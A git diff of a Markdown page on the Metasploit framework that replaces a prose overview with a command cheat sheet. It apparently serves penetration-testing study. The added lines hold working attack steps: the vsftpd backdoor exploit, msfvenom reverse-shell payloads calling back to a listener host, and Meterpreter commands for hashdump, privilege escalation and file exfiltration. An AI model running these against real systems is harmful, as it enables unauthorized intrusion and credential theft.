@@ -1,16 +1,95 @@
-# What is Metasploit ?
-Metasploit is a powerful open-source penetration testing framework that provides security professionals and ethical hackers with a comprehensive suite of tools to identify and exploit vulnerabilities in computer systems. Developed by Rapid7, Metasploit simplifies the process of discovering and testing security weaknesses, helping organizations secure their networks by identifying and addressing potential points of compromise.
+# Metasploit Framework
 
-Here are some key concepts and components of Metasploit that might help you understand it better as a beginner:
+Metasploit (by Rapid7) is the most widely used **exploitation framework**. It bundles thousands of exploits, payloads, and post-exploitation modules behind a single console (`msfconsole`), letting you go from "found a vulnerable service" to "got a shell" quickly.
 
-- Framework: Metasploit is built on a modular framework that allows users to customize and extend its capabilities. It provides a flexible and extensible environment for security professionals to create, test, and execute exploits.
-- Exploits: An exploit is a piece of code or a software tool that takes advantage of a vulnerability in a system to compromise its security. Metasploit includes a vast collection of pre-built exploits for various software and systems, making it easier for users to test and demonstrate vulnerabilities.
-- Payloads: Once a vulnerability is exploited, a payload is delivered to the target system. Payloads are pieces of code that perform specific actions on the compromised system, such as establishing a reverse shell for remote access, collecting information, or installing malware.
-- Auxiliary Modules: Metasploit includes auxiliary modules that perform various tasks, such as scanning, fingerprinting, and information gathering. These modules help security professionals assess the target environment and identify potential vulnerabilities.
-- Post-Exploitation Modules: After a successful compromise, post-exploitation modules in Metasploit enable users to interact with the compromised system. This includes tasks like privilege escalation, data extraction, and lateral movement within the network.
-- MSFconsole: The MSFconsole is the primary command-line interface for interacting with Metasploit. It provides a powerful yet user-friendly environment for launching exploits, managing sessions, and navigating through the various modules.
-- Meterpreter: Meterpreter is a post-exploitation payload that provides an interactive command-line shell on the compromised system. It offers a wide range of functionalities, allowing users to control the compromised system, gather information, and perform additional exploitation steps.
-- Community and Updates: Metasploit has a vibrant community of security professionals who contribute to its development and share their findings. Regular updates ensure that the framework stays current with the latest vulnerabilities and exploits.
-- Learning Resources: For beginners, there are numerous online tutorials, documentation, and courses available to help you understand and master Metasploit. Rapid7 provides official documentation, and there are also community-contributed resources to guide you through the learning process.
+## Core concepts
 
-It's important to note that while Metasploit is a powerful tool for ethical hacking and penetration testing, it should only be used in legal and authorized scenarios. Unauthorized use of Metasploit or any other hacking tools is illegal and can result in severe consequences. Always ensure that you have the proper authorization before conducting any security testing.
+- **Exploit** - code that abuses a specific vulnerability
+- **Payload** - what runs after the exploit (reverse shell, Meterpreter)
+- **Auxiliary** - scanners, fuzzers, brute-forcers (no exploit)
+- **Post** - modules run on an already-compromised host
+- **Encoder / NOP** - obfuscate payloads to evade AV/filters
+- **Meterpreter** - an advanced in-memory payload with a rich command set
+
+## Start up
+
+```bash
+sudo msfdb init      # set up the database (enables workspaces/search)
+msfconsole           # launch the console
+db_status            # confirm DB connected
+```
+
+## Finding and running a module
+
+```text
+search type:exploit name:vsftpd        # find modules
+use exploit/unix/ftp/vsftpd_234_backdoor
+info                                    # module details
+show options                            # required settings
+set RHOSTS 10.10.10.5
+set RPORT 21
+show payloads                           # compatible payloads
+set PAYLOAD cmd/unix/interact
+check                                    # is target vulnerable? (some modules)
+exploit          # or: run
+```
+
+## Payloads with msfvenom
+
+```bash
+# Linux reverse shell (ELF)
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
+
+# Windows reverse shell (EXE)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
+
+# PHP / web
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
+
+# List formats/payloads
+msfvenom --list payloads | grep windows
+```
+
+## Catch the shell with the handler
+
+```text
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+set LPORT 4444
+exploit -j          # run as background job
+```
+
+## Meterpreter essentials
+
+```text
+sysinfo                 # target info
+getuid                  # current user
+getsystem               # attempt privesc to SYSTEM (Windows)
+hashdump                # dump password hashes
+ps / migrate <pid>      # move into another process
+shell                   # drop to native OS shell
+download /etc/passwd    # exfiltrate
+upload local remote     # push a file
+run post/multi/recon/local_exploit_suggester   # find privesc
+background              # keep session, return to msf
+sessions -l  /  sessions -i 1                   # list / interact
+```
+
+## Workspaces + recon integration
+
+```text
+workspace -a client1              # organise engagements
+db_nmap -sV 10.10.10.0/24         # nmap results into the DB
+hosts / services / vulns          # view collected data
+```
+
+## Tips
+
+- Use `setg` to set global options (LHOST) across modules.
+- `sessions -u <id>` upgrades a basic shell to Meterpreter.
+- Only run against authorized targets - Metasploit is loud and can crash services.
+
+## Resources
+
+- [Metasploit Unleashed (free course)](https://www.offsec.com/metasploit-unleashed/)
